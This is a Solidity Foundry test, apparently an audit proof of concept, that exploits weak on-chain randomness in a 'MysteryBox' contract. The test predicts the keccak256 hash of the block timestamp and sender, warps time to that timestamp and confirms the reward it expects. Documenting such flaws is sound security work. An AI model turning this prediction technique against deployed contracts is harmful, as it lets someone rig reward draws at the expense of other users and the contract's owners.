// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/MysteryBox.sol"; // Adjust the path as necessary

contract MysteryBoxExploit is Test {
    MysteryBox mysteryBox;
    address attacker = address(0xBEEF);

    function setUp() public {
        // Deploy the MysteryBox contract with initial seed funds
        mysteryBox = new MysteryBox{value: 0.1 ether}();
    }

    function testWeakPRNGExploit() public {
        vm.deal(attacker, 10 ether);
        vm.startPrank(attacker);

        // Attacker buys a box
        mysteryBox.buyBox{value: 0.1 ether}();

        // Preparing a timestamp and address to control our random value
        uint256 targetTimestamp = block.timestamp + 1; // Next block timestamp
        vm.warp(targetTimestamp); // Warp the blockchain to the target timestamp

        // Predict the random value
        uint256 randomValue = uint256(keccak256(abi.encodePacked(targetTimestamp, attacker))) % 100;
        console.log("Expected random value:", randomValue);

        // Open the box and capture the reward
        mysteryBox.openBox();

        // Check if the reward matches our prediction based on the random value
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
        string memory expectedReward;

        if (randomValue < 75) {
            expectedReward = "Coal";
        } else if (randomValue < 95) {
            expectedReward = "Bronze Coin";
        } else if (randomValue < 99) {
            expectedReward = "Silver Coin";
        } else {
            expectedReward = "Gold Coin";
        }

        require(
            keccak256(bytes(rewards[0].name)) == keccak256(bytes(expectedReward)),
            "Exploit failed: reward does not match expectation"
        );

        console.log("Exploit success: received the expected reward:", expectedReward);

        vm.stopPrank();
    }
}
